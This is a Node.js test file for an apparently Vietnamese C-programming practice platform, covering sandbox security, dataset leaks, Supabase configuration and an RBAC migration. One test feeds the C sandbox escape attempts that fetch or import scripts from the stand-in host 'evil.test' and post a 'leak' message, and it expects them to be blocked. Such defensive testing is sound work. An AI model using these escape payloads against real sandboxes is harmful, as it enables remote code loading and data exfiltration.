import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { PRF192_MASTER_PROBLEMS } from '../src/data/prf192MasterDataset.ts';
import { executeCCode } from '../src/services/cExecutionEngine.ts';
import {
  DEFAULT_SUPABASE_URL,
  DEFAULT_SUPABASE_ANON_KEY,
} from '../src/services/supabaseAuth.ts';
import {
  showToast,
  askConfirm,
  subscribeToToasts,
  subscribeToConfirm,
} from '../src/services/uiFeedback.ts';

test('1. Zero leaked reference solution code in PRF192_MASTER_PROBLEMS client dataset', () => {
  assert.equal(PRF192_MASTER_PROBLEMS.length, 115);
  const leaked = PRF192_MASTER_PROBLEMS.filter((p) => 'code' in p && p.code !== undefined);
  assert.equal(leaked.length, 0, 'No reference solution code may exist in client dataset');
});

test('2. Sandbox blocks worker/global escape identifiers (self, importScripts, postMessage, Reflect)', () => {
  const attempts = [
    `#include <stdio.h>\nint main() { self.fetch("https://evil.test"); return 0; }`,
    `#include <stdio.h>\nint main() { importScripts("https://evil.test/x.js"); return 0; }`,
    `#include <stdio.h>\nint main() { postMessage("leak"); return 0; }`,
    `#include <stdio.h>\nint main() { Reflect.get({}, "a"); return 0; }`,
  ];

  for (const code of attempts) {
    const res = executeCCode(code, '');
    assert.equal(res.status, 'CE', `Expected CE for escape attempt: ${code}`);
    assert.ok(
      res.stderr.includes('security violation'),
      `Expected security violation stderr, got: ${res.stderr}`
    );
  }
});

test('3. sizeof(char_array) + fgets(..., stdin) + printf("%s") handles full string without 3-char truncation or commas', () => {
  const code = `
#include <stdio.h>
int main() {
    char s[100];
    fgets(s, sizeof(s), stdin);
    printf("%s", s);
    return 0;
}
`;
  const input = 'Lap trinh C an toan bo nho';
  const res = executeCCode(code, input);
  assert.equal(res.status, 'SUCCESS', `Expected SUCCESS, got ${res.status}: ${res.stderr}`);
  assert.equal(res.stdout, input);
});

test('4. GEMINI.md invariants preserved in supabaseAuth.ts and VnoiAuthModal.tsx', () => {
  assert.equal(DEFAULT_SUPABASE_URL, 'https://dcfehiahdpbfvyzekchr.supabase.co');
  assert.ok(
    DEFAULT_SUPABASE_ANON_KEY.startsWith('sb_publishable_'),
    'DEFAULT_SUPABASE_ANON_KEY must preserve sb_publishable_ fallback'
  );

  const authModalSrc = fs.readFileSync(
    path.resolve('src/components/VnoiAuthModal.tsx'),
    'utf-8'
  );
  assert.ok(
    authModalSrc.includes('saveSupabaseConfig'),
    'VnoiAuthModal.tsx must retain inline quick Supabase config persistence'
  );
  assert.ok(
    authModalSrc.includes('Settings'),
    'VnoiAuthModal.tsx must retain settings gear UI trigger'
  );
});

test('5. Privacy & RBAC SQL migration closes email PII leak and prevents self-elevation', () => {
  const sql = fs.readFileSync(
    path.resolve('supabase/migrations/20261118_phase1_privacy_and_rbac_hardening.sql'),
    'utf-8'
  );
  assert.ok(sql.includes('is_super_admin()'), 'Must define SECURITY DEFINER is_super_admin()');
  assert.ok(sql.includes('private_profiles'), 'Must define private_profiles table');
  assert.ok(
    sql.includes('enforce_profile_security_invariants()'),
    'Must define profile security invariant trigger'
  );
  assert.ok(
    sql.includes('drop policy if exists "Public profiles are viewable by everyone" on public.profiles'),
    'Must drop public select policy that exposed email addresses'
  );
  assert.ok(
    sql.includes('get_public_leaderboard'),
    'Must expose safe public leaderboard RPC without email column'
  );
});

test('6. uiFeedback bus notifies toast and confirm subscribers cleanly in Node', async () => {
  const receivedToasts = [];
  const unsubToast = subscribeToToasts((item) => receivedToasts.push(item));
  showToast('Kiểm thử thông báo', 'success', 2000);
  unsubToast();

  assert.equal(receivedToasts.length, 1);
  assert.equal(receivedToasts[0].message, 'Kiểm thử thông báo');
  assert.equal(receivedToasts[0].variant, 'success');

  // When no confirm host is subscribed, resolves false safely
  assert.equal(await askConfirm({ title: 'Test', message: 'No host' }), false);

  // When confirm host is subscribed, passes confirm result back
  const unsubConfirm = subscribeToConfirm((req) => req.resolve(true));
  const accepted = await askConfirm({ title: 'Xác nhận', message: 'Đồng ý?' });
  unsubConfirm();
  assert.equal(accepted, true);
});
